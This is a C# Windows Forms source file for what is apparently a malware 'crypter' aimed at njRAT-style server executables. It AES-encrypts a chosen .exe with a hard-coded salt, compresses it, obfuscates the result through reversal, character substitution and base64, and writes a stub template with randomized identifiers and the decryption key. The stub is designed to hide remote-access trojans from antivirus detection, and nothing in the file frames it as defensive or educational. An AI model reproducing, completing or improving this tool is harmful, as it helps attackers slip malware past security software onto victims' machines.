using Server_Crypter.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server_Crypter
{
    public partial class cryptNj : Form
    {
        private Random rand = new Random();

        public cryptNj()
        {
            InitializeComponent();
        }

        private void boosterButton1_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Server .exe|*.exe";
            openFileDialog.ShowDialog();

            if(openFileDialog.FileName.Length == 0)
            {
                return;
            }

            boosterTextBox1.Text = openFileDialog.FileName;
        }

        public static byte[] EncryptExe(byte[] exeBytes, string PassKey)
        {
            checked
            {
                byte[] result;
                byte[] bytes = Encoding.UTF8.GetBytes(PassKey);
                int iterations = 2444;
                byte[] salt = new byte[]
                {
                    95,
                    70,
                    46,
                    145,
                    68,
                    167,
                    230,
                    153,
                    138,
                    178,
                    195,
                    212,
                    31,
                    27,
                    189,
                    99,
                    74,
                    176,
                    166,
                    103,
                    132,
                    184,
                    75,
                    201,
                    107,
                    224,
                    15,
                    248,
                    228,
                    215
                };
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (AesManaged aesManaged = new AesManaged())
                    {
                        aesManaged.KeySize = 256;
                        aesManaged.BlockSize = 128;
                        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, iterations);
                        aesManaged.Key = rfc2898DeriveBytes.GetBytes((int)Math.Round(Math.Round((double)aesManaged.KeySize / 8.0)));
                        aesManaged.IV = rfc2898DeriveBytes.GetBytes((int)Math.Round(Math.Round((double)aesManaged.BlockSize / 8.0)));
                        aesManaged.Mode = CipherMode.CBC;
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesManaged.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(exeBytes, 0, exeBytes.Length);
                            cryptoStream.Close();
                        }
                        result = memoryStream.ToArray();
                        return result;
                    }
                }
            }
        }

        public static string GetUniqueKey(int maxSize)
        {
            char[] chars = new char[62];
            chars =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();
            byte[] data = new byte[1];
            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
            {
                crypto.GetNonZeroBytes(data);
                data = new byte[maxSize];
                crypto.GetNonZeroBytes(data);
            }
            StringBuilder result = new StringBuilder(maxSize);
            foreach (byte b in data)
            {
                result.Append(chars[b % (chars.Length)]);
            }
            return result.ToString();
        }

        private void boosterButton2_Click(object sender, EventArgs e)
        {
            if(!boosterTextBox1.Text.Contains(".exe"))
            {
                return;
            }

            string key = GetUniqueKey(rand.Next(1, 50 + 1));

            //Encrypt Server method:
            byte[] serverbin = File.ReadAllBytes(boosterTextBox1.Text);
            byte[] hash = EncryptExe(serverbin, key);
            byte[] compress = Compress(hash);



            string source = BitConverter.ToString(compress).ToString();


            string text = new string(source.Reverse<char>().ToArray<char>());
            string newValue = text.Replace('0', '+').Replace("-", "");
            string aa = newValue.Replace('7', '?');
            string bb = Base64Encode(aa);
            


            string BUILD = Resources.STUBAMBOULA;


            StreamWriter writer = new StreamWriter("./stub.txt");
            writer.Write(BUILD.Replace("%RANDOMNAME%", GetUniqueKey(rand.Next(1, 25+1)).Replace("%hexa%", GetUniqueKey(rand.Next(1, 25 + 1)).Replace("%Decompress%", GetUniqueKey(rand.Next(1, 25 + 1)).Replace("%BYTERANDOMNAME%", GetUniqueKey(rand.Next(1, 25 + 1)))))));
            writer.Close();

            Console.WriteLine("Stub builded successfuly");

            stubRicheText.Text = BUILD.Replace("%RANDOMNAME%", GetUniqueKey(rand.Next(1, 25 + 1))).Replace("%hexa%", GetUniqueKey(rand.Next(1, 25 + 1))).Replace("%Decompress%", GetUniqueKey(rand.Next(1, 25 + 1))).Replace("%BYTERANDOMNAME%", GetUniqueKey(rand.Next(1, 25 + 1))).Replace("%KEYDECODE%", key);
            resourcesRichText.Text = bb;



        }

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        private byte[] Compress(byte[] data)
        {
            using (MemoryStream output = new MemoryStream())
            {
                using (GZipStream zip = new GZipStream(output, CompressionMode.Compress, true))
                {
                    zip.Write(data, 0, data.Length);
                }
                return output.ToArray();
            }
        }

        private byte[] Decompress(byte[] data)
        {
            using (MemoryStream memory = new MemoryStream(data))
            using (GZipStream zip = new GZipStream(memory, CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream output = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = zip.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            output.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return output.ToArray();
                }
            }
        }
        
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }
    }
}
